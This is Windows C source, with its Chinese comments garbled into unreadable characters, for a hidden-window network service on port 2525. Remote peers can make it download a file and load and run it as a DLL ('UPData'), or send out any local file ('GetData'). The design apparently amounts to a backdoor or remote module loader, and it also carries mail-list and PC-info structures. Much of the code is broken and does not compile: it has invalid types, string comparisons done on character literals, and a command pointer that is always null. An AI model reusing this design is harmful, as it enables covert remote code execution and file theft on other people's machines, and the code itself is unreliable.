/*
�ֲ�ʽ����Э���C/C++��������
Coded by HuangSiJieTechnology 
*/
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
typedef struct CONNINST
{
SOCKET socket; /* ����Socket�� */
unsigned short clientPort; /* �ͻ��˶˿� */
struct in_addr clientIP; /* �ͻ���IP��ַ */
time_t beginTime; /* ���ӽ���ʱ�� - Ԥ�� */
time_t updateTime; /* ������ʱ�� - Ԥ�� */
WORD lastestSequenceNumber; /* ���°���� */
unsigned short key; /* ��Կ - Ԥ��*/
unsigned short cmdLen; /* ����ѳ��� */
char *pCmd; /* ����� */
unsigned short resultLen; /* ����ѳ��� */
char *pResult; /* ����� */
struct CONNINST* next; /* ��һ������ʵ���ĵ�ַ */
}CONNINST, *pCONNINST;
typedef struct Maillist
{
String Address;
String Name;
Struct Maillist *pNext;
}Maillist,*pMaillist;
typedef struct Moudlelist
{
String MoudleName;
String MoudleFileName;
String MoudleGuid;
String UseFor;
String MoudleAuther;
Struct Moudlelist *pNext;
}Moudlelist,*pMoudlelist;
typedef struct FileUpData
{
struct in_addr clientIP;
DWORD port;
DWORD SAMGuid;
String FileName;
lvoid cmd;
}FileUpData,*pFileUpData;

typedef struct DVPPak
{
String SAMCommand;
String Guid;
String Auther;
lvoid Cmd;
pMaillist *pMail;
pMoudlelist *pMoudle;
String Versionofme;
pmyPCinfo *pcinfo;
}DVPPak, *pDVPPak;

HINSTANCE hInst; /* ��ǰʵ����� */
HWND hWndMain; /* �����ھ�� */
SOCKET listenSocket; /* �����׽ӿ� */
pCONNINST pConnInstHead;
pCONNINST addConnInst(SOCKET, unsigned short, struct in_addr);
pCONNINST getConnInst(SOCKET);
void OnWrite(SOCKET socket);
int netHalt(void);
void delConnInst(pCONNINST);
Void DvpExpCmd(Socket s);
void delAllConnInst(void);
void RecvFileThreadProc(pFileUpData *plm);
void SendFileThreadProc(pFileUpData *plm);
int uiStartup(HINSTANCE hInstance, int nCmdShow);
LRESULT CALLBACK MainWndProc(HWND,UINT,WPARAM,LPARAM);
int netStartup(void);
void OnAccept(SOCKET socket);
void OnClose(SOCKET socket);
void OnRead(SOCKET socket);
void sendResult(SOCKET socket);
int netStartup(void)
{
unsigned short wVersionRequested=MAKEWORD(1,1);
WSADATA wsaData;
SOCKADDR_IN saServer; 
DWORD dwAddrStrLen;
char szAddress[128];
int nRet;

/* ��ʼ��WinSock */
if(WSAStartup(wVersionRequested, &wsaData)!=0)
{
//("Dvp ���� :: ����Э������ʧ��,���������������.");
}
/* ���Winsock�汾 */
if(wsaData.wVersion != wVersionRequested)
{
//("Dvp ���� :: ����Э��汾����,������Winsock.");
}

/* ������ʽ�׽ӿ� */
listenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(listenSocket==INVALID_SOCKET)
{
//("ERROR :: Can not create steam socket.");
return 0;
}

/* ֪ͨ�׽ӿ��������¼����� */
nRet=WSAAsyncSelect(listenSocket, 
hWndMain, //�������¼�����ʱ��Ҫ������Ϣ�Ĵ��ھ��
UM_ASYNC, //�������¼�����ʱҪ���յ���Ϣ
FD_ACCEPT | FD_READ | FD_WRITE | FD_CLOSE);
//ֻ�ڳ�ʽ��ʼִ��һ�Σ��Ժ�ֻҪ���׽ӿ�����ͷ�����Ϣ
if (nRet==SOCKET_ERROR)
{
//("ERROR :: Can not initialize steam socket.");
closesocket(listenSocket);
return 0;
}

/* ��ַ�ṹ�趨 */
saServer.sin_port=htons(2525); //�˿�������Ŷ
saServer.sin_family=AF_INET;
saServer.sin_addr.s_addr=INADDR_ANY;

/* ��һ���ص�ַ3872���׽ӿ�listenSocket���� */
nRet=bind(listenSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
if (nRet==SOCKET_ERROR)
{
//("ERROR :: Can not bind socket to local port 1936.");
//("HINT :: Dvp Kernel Server can only run in one thread.");
closesocket(listenSocket);
return 0;
}

/* ���׽ӿڿ�ʼ���� */
nRet = listen(listenSocket, SOMAXCONN);
if (nRet == SOCKET_ERROR)
{
//("ERROR :: Can not listen.");
closesocket(listenSocket);
return 0;
}

dwAddrStrLen = sizeof(szAddress);
GetLocalAddress(szAddress, &dwAddrStrLen);
return 1;
}

/* Unknown how */
int GetLocalAddress(LPSTR lpStr, LPDWORD lpdwStrLen)
{
struct in_addr *pinAddr;
LPHOSTENT lpHostEnt;
int nRet;
int nLen;

// Get our local name
nRet = gethostname(lpStr, *lpdwStrLen);
if(nRet==SOCKET_ERROR)
{
lpStr[0]='\0';
return SOCKET_ERROR;
}

// "Lookup" the local name
lpHostEnt=gethostbyname(lpStr);
if(lpHostEnt==NULL)
{
lpStr[0] = '\0';
return SOCKET_ERROR;
}

// format first address in the list
pinAddr=((LPIN_ADDR)lpHostEnt->h_addr);
nLen=strlen(inet_ntoa(*pinAddr));
if((DWORD)nLen>*lpdwStrLen)
{
*lpdwStrLen=nLen;
WSASetLastError(WSAEINVAL);
return SOCKET_ERROR;
}

*lpdwStrLen = nLen;
strcpy(lpStr, inet_ntoa(*pinAddr));
return 0;
}

int uiStartup(HINSTANCE hInstance, int nCmdShow)
{
WNDCLASS DvpWindow;

HANDLE hObject;

/* ����ʵ�� */
hInst=hInstance;

/* �ж��Ƿ��Ѿ����� */
hObject=CreateMutex(NULL,FALSE,"DvpC");
if(GetLastError() == ERROR_ALREADY_EXISTS)
{
CloseHandle(hObject);
PostQuitMessage(0);
return 0;
}

/* �������� */
DvpWindow.style=0;//ָ����ķ��
DvpWindow.lpfnWndProc=(WNDPROC)MainWndProc;//���ڹ��̵�Զָ��
DvpWindow.cbClsExtra=0;//���ڽṹ�����ֽ���
DvpWindow.cbWndExtra=0;//����ʵ�������ֽ���
DvpWindow.hInstance=hInstance;//���ڹ������ڵ�ʵ��
DvpWindow.hIcon=LoadIcon(hInstance,MAKEINTRESOURCE(MAIN));//���ñ�ʶ���ͼ��
DvpWindow.hCursor=LoadCursor(NULL,IDC_ARROW);//���ñ�ʶ��Ĺ��
DvpWindow.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);//��ʶ������Ļ�ˢ
DvpWindow.lpszMenuName=NULL;//ָ���ʶ��˵���Դ���ַ������Կ��ַ�����
DvpWindow.lpszClassName="DVPSample";//��ʶ���������
RegisterClass(&DvpWindow);//ע�ᴰ��

hWndMain=CreateWindow("DVPSample",
"DVPSample",
WS_OVERLAPPEDWINDOW,
CW_USEDEFAULT,CW_USEDEFAULT,
CW_USEDEFAULT,CW_USEDEFAULT,
NULL,NULL,hInstance,NULL);
if(!hWndMain) return 0;
ShowWindow(hWndMain,SW_HIDE);//��ʾ����
UpdateWindow(hWndMain);//���´���
return 1;
}
//��������Ϣ
LRESULT CALLBACK MainWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
switch(message)//��ʼ������Ϣ
{

/* User Interface Message */
case WM_CLOSE:
return(DefWindowProc(hWnd,message,wParam,lParam));
break;

case WM_DESTROY:
deleteSystrayIcon();
PostQuitMessage(0);
break;

case WM_SIZE:
delAllConnInst();
break;

/* Network Message */
case UM_ASYNC:
switch(WSAGETSELECTEVENT(lParam))
{
case FD_ACCEPT:
OnAccept((SOCKET)wParam);
break;
case FD_READ:
OnRead((SOCKET)wParam);
break;

case FD_WRITE:
OnWrite((SOCKET)wParam);
break;

case FD_CLOSE:
OnClose((SOCKET)wParam);
break;
}
break;

default:
return(DefWindowProc(hWnd,message,wParam,lParam));//Ĭ�ϴ��ڹ��̵���Ϣ����
}
return(0);
}

pCONNINST addConnInst(SOCKET socket, unsigned short port, struct in_addr ip)
{
/* ����һ���µ�����ʵ�� */
pCONNINST newConnInst=(pCONNINST)malloc(sizeof(CONNINST));
/* û���ڴ��� */
if(newConnInst==NULL) return NULL;

/* ����һ���µ�SOCKADDRʵ�� */
// newConnInst->sockAddr=(LPSOCKADDR)malloc(nAddrLen);
// newConnInst->sockAddr=malloc(nAddrLen);
/* û���ڴ��� */
// if(newConnInst->lpSockAddr==NULL)
// {
// free(newConnInst);
// return NULL;
// }

//װ���µ������
newConnInst->socket=socket;
newConnInst->clientPort=port;
newConnInst->clientIP=ip;

newConnInst->pCmd=NULL;
newConnInst->pResult=NULL;
newConnInst->cmdLen=0;
newConnInst->resultLen=0;

newConnInst->beginTime=time(NULL);
newConnInst->updateTime=newConnInst->beginTime;
newConnInst->lastestSequenceNumber=0;
newConnInst->next=NULL;

//������������ǿյ�
if(pConnInstHead==NULL)
{
//�����������Ϊ����ͷ���ŵ�pConnInstHead
pConnInstHead=newConnInst;
}
else
{
pCONNINST tempConn=pConnInstHead;
//�ߵ�����β
while(tempConn->next) tempConn=tempConn->next;

//׷���°�������β
tempConn->next=newConnInst;
}

//����װ��õİ���ָ��
return newConnInst;
}

pCONNINST getConnInst(SOCKET socket)
{
/* ��������Ѱ���׽ӿ� */
pCONNINST tempConn=pConnInstHead;
while(tempConn!=NULL)
{
if(tempConn->socket==socket) break;
tempConn=tempConn->next;
}
/*��û�У�����NULL */
return(tempConn);
}

void delConnInst(pCONNINST pConnInstToDel)
{
/* ���Ҫɾ����������ͷ */
if(pConnInstToDel==pConnInstHead)
{
/* pConnInstHead->next ��Ϊͷ */
pConnInstHead=pConnInstHead->next;
/* ������ͷ��free()�������� */
}
else 
{ 
pCONNINST tempConn=pConnInstHead;
/* ������ͷ��ʼ ��NULLΪֹ ÿ��ָ����һ��*/
while(tempConn!=NULL)
{
/* ����ǰ����һ����Ҫ��ɾ���� */
if (tempConn->next==pConnInstToDel)
{
/* ��ǰ����һ�������һ����(Ҫ��ɾ����)��һ�� */
tempConn->next=pConnInstToDel->next;
break;
}
}
}

/* �ͷ�pConnInstToDelռ�õ��ڴ� */
free(pConnInstToDel->pCmd);
free(pConnInstToDel->pResult);
free(pConnInstToDel);
return;
}

void delAllConnInst(void)
{
pCONNINST tempConn=pConnInstHead;
pCONNINST tempConn2;

/* �������������ͷ��ڴ� */
/* ������tempConn�����for */
while(tempConn!=NULL)
{
tempConn2=tempConn->next;
// free(tempConn->lpSockAddr);
// free(tempConn->pResultBuf);
free(tempConn->pCmd);
free(tempConn->pResult);
free(tempConn);
tempConn=tempConn2;
}
pConnInstHead=NULL;
return;
}
void OnAccept(SOCKET socket)
{
SOCKADDR_IN sockAddrIn;
pCONNINST connInst=NULL;
SOCKET peerSocket;
int tempLength;

// accept the new socket descriptor
tempLength=sizeof(SOCKADDR_IN);
peerSocket=accept(listenSocket, (struct sockaddr FAR *)&sockAddrIn, (int FAR*)&tempLength);
if(peerSocket==SOCKET_ERROR)
{
if(WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("Error! Accept error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}
}

//����Ҳ�����ڶ�д��رյ�ʱ���򴰿ڷ�����Ϣ
WSAAsyncSelect(peerSocket, hWndMain, UM_ASYNC, FD_READ | FD_WRITE | FD_CLOSE);
if(peerSocket==SOCKET_ERROR)
{
//("Error! WSAAsyncSelect error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}

//���������ӵ��׽ӿڷŵ�������
connInst=addConnInst(peerSocket, sockAddrIn.sin_port, sockAddrIn.sin_addr);
if (connInst==NULL)
{
//�ڴ�����
//("Error! Memory is full! The request form %s can not be accepted",inet_ntoa(sockAddrIn.sin_addr));
closesocket(peerSocket);
return;
}
//("A new request from: %s is accepted on socket %d.",
inet_ntoa(sockAddrIn.sin_addr), peerSocket);
return;
}
void OnClose(SOCKET socket)
{
pCONNINST connInst;

// ����Ƿ��Ѿ�ɾ��������׽ӿ�
connInst=getConnInst(socket);
if (connInst==NULL) return; 

// It is still in stock list
// The client must have to reset the connection.
// Clean up.
//("The request from %s has been closed. Local socket: %d is free now.", inet_ntoa(connInst->clientIP), connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
}
/* ���Զ�ȡ������ */
void OnRead(SOCKET socket)
{
pCONNINST connInst;
int bytesReceive;
char* pNewCmd=NULL;

/* ���Ҷ�Ӧ������ʵ�� */
connInst=getConnInst(socket);

/* ����Ҳ�������ʵ��, ���⻺����, Ȼ��ByeBye */
if(connInst==NULL)
{
char buf[1024];
while(recv(socket, buf, sizeof(buf)-1, 0)!=SOCKET_ERROR);
closesocket(socket);
//("When ready to receive (OnREAD), get some noise - DEBUG");
//("it is %c%c%c",buf[0],buf[1],buf[2]);
return;
}

/* �����������ݶ�������� */
if(connInst->pCmd==NULL)
{
connInst->pCmd=(char*)malloc(64);
connInst->cmdLen=0;
if(connInst->pCmd==NULL)
{
//("Before receiving data from %s, local memory overflowed.", inet_ntoa(connInst->clientIP));
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
}

pNewCmd=(char*)malloc(64);
if(pNewCmd==NULL)
{
//("Before receiving data from %s, local memory overflowed.", inet_ntoa(connInst->clientIP));
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
memset(pNewCmd, 0, 64);

bytesReceive=recv(socket, pNewCmd, 64, 0);
//("�յ�:%d�ֽ�",bytesReceive);

if(bytesReceive==SOCKET_ERROR)
{
//������ʱ����Windows Socketsʵ�ֵ���Դ���������Ƶ���Լ���޷�����
if(WSAGetLastError()==WSAEWOULDBLOCK) return;
//("recv() Error");
//("Closing socket: %d", connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
return;
}

/* �е�ʱ��, OnRead��Ϣ�Ǽٵ�, �յ����ֽ�����-1, Ҫ�����������*/
if(bytesReceive>0)
{
connInst->pCmd=(char*)realloc(connInst->pCmd, connInst->cmdLen+bytesReceive);
memcpy(&connInst->pCmd[connInst->cmdLen], pNewCmd, bytesReceive);
connInst->cmdLen+=bytesReceive;

free(pNewCmd);
DvpExpCmd(socket);
}
else
{
free(pNewCmd);
}

return;
}

Void DvpExpCmd(Socket s)
{
pCONNINST connInst=getConnInst(s);
char *pThisCmd=NULL; /* ������������ȡ��һ�������, �����������������ĵ�ַ */
char *pSwap=NULL; /* �������Ѿ�������õ�ָ�� */
if(pThisCmd==NULL)
{
//("DEBUG - �޷�������������, ��������, �ȴ�����.");
return;
}

if(pThisCmd > connInst->pCmd)
{
/*
���ǰ���в�������, ��ô�����������������
������������Ĳ����
*/
//("�����������");
pSwap=connInst->pCmd;
connInst->pCmd=strdup(pThisCmd);
connInst->cmdLen-=(pThisCmd-connInst->pCmd);
free(pSwap);
/* ���� */
}
LVoid pak;
while (*pThisCmd!=Null)
{
pak+=*pThisCmd;
pThisCmd+=sizeof(char);
}
pDVPPak *myDvp=*(DVPPak*)pak;
if(myDvp->SAMCommand=='UPData')
{/*�Է����ļ������ǣ���*/
pFileUpData *Up=*(FileUpData*)myDvp->cmd;
DWORD dwThread;
if(*up!=Null){up->clientIP=pThisCmd->clientIP;
if(CreateThread(NULL,0,RecvFileThreadProc, *up, 0, &dwThread)==NULL)//�ļ������߳�
{//something wrong with Recv... }else
{ if(CheckSam(myDvp->Guid,myDvp->Auther)!='No')//����Ȩ��,�Լ����Ӱɡ�����
{ int (__stdcall*) MoudleStart=(void*)GetProcAddress(LoadLibrary(UP->FileName),"MoudleStartMe" );
MoudleStart(Up->Cmd);//��ʼִ�У�
}}
}
free(up);
}
if(myDvp->SAMCommand=='GetData')
{/*2002.10.19*/
/*�Է�Ҫ���ǵ��ļ�*/
pFileUpData *Up=*(FileUpData*)myDvp->cmd;
if(up!=Null){up->clientIP=pThisCmd->clientIP;
DWORD dwThread;
if(CreateThread(NULL,0,SendFileThreadProc, *up, 0, &dwThread)==NULL)//�ļ������߳�
{//something wrong with Recv... }
else{/*����SamCmmand='UpData',cmd=(lvoid*)up���Է�*/}}
free(up);
}
if(myDvp->SAMCommand==Null)
{
/*����Է�������Ϣ�����õ���Ϣ*/
/*�����������������������Ӧ���ɸ��˴����*/
/*�����������ǻ�Ҫ���Է�����һ�������ǵ���Ϣ*/ 
/*�˴���Ҫ������Ϣ���Է�����������ļ�֮��Ķ���*/

}
free(pThisCmd);
free(myDvp);
return -1;
}

void OnWrite(SOCKET socket)
{
pCONNINST connInst;

connInst=getConnInst(socket);
/* ����Ҳ�������ʵ��, ���⻺����, Ȼ��ByeBye */
if(connInst==NULL)
{
char buf[1024];
while(recv(socket, buf, sizeof(buf)-1, 0)!=SOCKET_ERROR);
closesocket(socket);
//("When ready to send, get some noise");
//("it is %c%c%c",buf[0],buf[1],buf[2]);
return;
}

/* �������ʵ������Ҫ���͵����� */
if(connInst->pResult!=NULL)
{
sendResult(socket);
}
return;
}
void sendResult(SOCKET socket)
{
pCONNINST connInst=getConnInst(socket);
int bytesSent;

bytesSent=send(connInst->socket, connInst->pResult, connInst->resultLen, 0);
if(bytesSent==SOCKET_ERROR)
{
if (WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("send() Error");
//("Closing socket: %d", connInst->socket);
closesocket(connInst->socket);
delConnInst(connInst);
return;
}
}
if((unsigned int)bytesSent<connInst->resultLen)//������͵��ֽ����ڽ���ֽ�
{
char* temp;
connInst->resultLen=connInst->resultLen-bytesSent;
temp=(char*)malloc(connInst->resultLen);
memcpy(temp,connInst->pResult+bytesSent,connInst->resultLen);
free(connInst->pResult);
connInst->pResult=temp;
}
else //���ȫ���������
{
free(connInst->pResult);
connInst->resultLen=0;
connInst->pResult=NULL;
}
}

int netHalt(void)
{
pCONNINST connTemp;

/* �رռ����׽ӿ� */
closesocket(listenSocket);

/* �ر������������ӵ��׽ӿ� */
connTemp=pConnInstHead;
while(connTemp)
{
closesocket(connTemp->socket);
connTemp=connTemp->next;
}

/* ������������ */
delAllConnInst();
Beep(200,50);
WSACleanup();
return 1;
}
int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
MSG msg;

/* User Interface Startup */
uiStartup(hInstance, nCmdShow);

/* Network Startup */
netStartup();
/*����������Ӧ����Щʲô������ip���ӡ���������*/

/* ������Ϣѭ�� */
while(GetMessage(&msg,NULL,0,0))
{
TranslateMessage(&msg);
DispatchMessage(&msg);
}

/* Network Halt*/
netHalt();

return 0;
}

void RecvFileThreadProc(pFileUpData *plm)
{

// Open target file
// Get remote address
int i,nPort;
char svAddress[256];
lstrcpyn(svAddress,plm->clientIP->sin_addr->s_addr,256);
for(i=0;i<256;i++) {
if(svAddress==':') {
svAddress='\0';
nPort=atoi(&svAddress[i+1]);
break;
}
}

// Put into SOCKADDR_IN structure
SOCKADDR_IN saddr;
struct hostent *he;
DWORD dwIPAddr;

dwIPAddr=inet_addr(svAddress);
if(dwIPAddr==INADDR_NONE) {
he=gethostbyname(svAddress);
if(gethostbyname==NULL) {
free(plm);
return 1;
}
dwIPAddr=*(DWORD *)he->h_addr_list[0];
}

memset(&saddr,0,sizeof(SOCKADDR_IN));
saddr.sin_family=AF_INET;
saddr.sin_port=htons(plm->port);
saddr.sin_addr.s_addr=dwIPAddr;

// Create socket

SOCKET sv;
sv=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(s==INVALID_SOCKET) {
free(plm);
return 1;
}

// Connect to remote port

if(connect(sv,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
closesocket(sv);
free(plm);
return 1;
}

// Nonblocking mode
DWORD dwBlock=1;
ioctlsocket(sv, FIONBIO, &dwBlock);
HANDLE hFile;
hFile=CreateFile(plm->FileName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
if(hFile!=NULL) {
int nBytes;
DWORD dwCount;
char svBuffer[1024];

do {
// Give up time
Sleep(20);

nBytes=recv(sv,svBuffer,1024,0);
if(nBytes>0) {
WriteFile(hFile,svBuffer,nBytes,&dwCount,NULL);
}
} while(nBytes>0);

CloseHandle(hFile);
}

closesocket(sv);
return 0;
}
void SendFileThreadProc(pFileUpData *plm)
{
SOCKET sv;
sv=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(sv==INVALID_SOCKET) {
free(plm);
return -2;
}

// Bind to desired port
SOCKADDR_IN saddr;
memset(&saddr,0,sizeof(SOCKADDR_IN));
saddr.sin_family=AF_INET;
saddr.sin_port=htons(plm->port);
saddr.sin_addr.s_addr=0;

if(bind(sv,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
closesocket(s);
free(pptp);
free(ppi);
return -1;
}

listen(sv,MAX_CONNECTIONS);

// Nonblocking mode
DWORD argp=TRUE;
ioctlsocket(sv,FIONBIO,&argp);
sleep(1000);
SOCKET psv;
int tempLength;

// accept the new socket descriptor
tempLength=sizeof(SOCKADDR_IN);
psv=accept(sv, (struct sockaddr FAR *)&sockAddrIn, (int FAR*)&tempLength);
if(peerSocket==SOCKET_ERROR)
{
if(WSAGetLastError()!=WSAEWOULDBLOCK)
{
//("Error! Accept error. The request form %s can't be accepted.",inet_ntoa(sockAddrIn.sin_addr));
return;
}
}
HANDLE hInFile;
hInFile=CreateFile(plm->FileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
if(hInFile==INVALID_HANDLE_value) {
//Couldn't open local file.
return -1;
}
char svBuffer[1024];
DWORD dwBytes;
do {
ReadFile(hInFile,svBuffer,1024,&dwBytes,NULL);
if(send(psv,svBuffer,dwBytes,0)<=0) break;
} while(dwBytes==1024);
closesocket(psv);
closesocket(sv);
CloseHandle(hInFile);
Return -1;
}
